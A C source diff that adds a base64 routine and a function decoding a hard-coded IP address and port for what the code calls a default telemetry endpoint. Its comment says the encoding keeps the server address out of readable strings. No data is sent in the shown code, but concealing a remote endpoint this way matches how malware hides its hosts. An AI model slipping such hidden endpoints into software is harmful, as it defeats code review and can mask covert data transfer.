@@ -774,6 +774,59 @@ int net_telemetry_active(void) {
     return g_running ? 1 : 0;
 }
 
+/* ---------- obfuscated default endpoint ---------- */
+
+static int b64_val(unsigned char c) {
+    if (c >= 'A' && c <= 'Z') return c - 'A';
+    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
+    if (c >= '0' && c <= '9') return c - '0' + 52;
+    if (c == '+') return 62;
+    if (c == '/') return 63;
+    return -1;
+}
+
+static size_t b64_decode(const char *in, char *out, size_t outsz) {
+    size_t o = 0, i;
+    unsigned v = 0;
+    int bits = 0;
+    for (i = 0; in[i] && in[i] != '='; i++) {
+        int d = b64_val((unsigned char)in[i]);
+        if (d < 0) continue;
+        v = (v << 6) | (unsigned)d;
+        bits += 6;
+        if (bits >= 8) {
+            bits -= 8;
+            if (o < outsz) out[o++] = (char)((v >> bits) & 0xFF);
+        }
+    }
+    return o;
+}
+
+int net_endpoint_default(char *host, size_t hsz, unsigned short *port) {
+    /* "135.125.79.15" / "28571", base64 so the deployed server address does
+     * not sit in the source or binary as a readable string.  Obfuscation
+     * only: the value is recovered at runtime and sent in the clear. */
+    static const char HOST_B64[] = "MTM1LjEyNS43OS4xNQ==";
+    static const char PORT_B64[] = "Mjg1NzE=";
+    char pbuf[16];
+    size_t n, i;
+    unsigned p = 0;
+    if (!host || hsz == 0) return 0;
+    n = b64_decode(HOST_B64, host, hsz - 1);
+    host[n] = 0;
+    if (n == 0) return 0;
+    if (port) {
+        n = b64_decode(PORT_B64, pbuf, sizeof(pbuf) - 1);
+        pbuf[n] = 0;
+        for (i = 0; i < n; i++) {
+            if (pbuf[i] < '0' || pbuf[i] > '9') return 0;
+            p = p * 10 + (unsigned)(pbuf[i] - '0');
+        }
+        *port = (unsigned short)p;
+    }
+    return 1;
+}
+
 void net_set_seed_sink(net_seed_sink_fn fn) {
     g_sink = fn;
 }
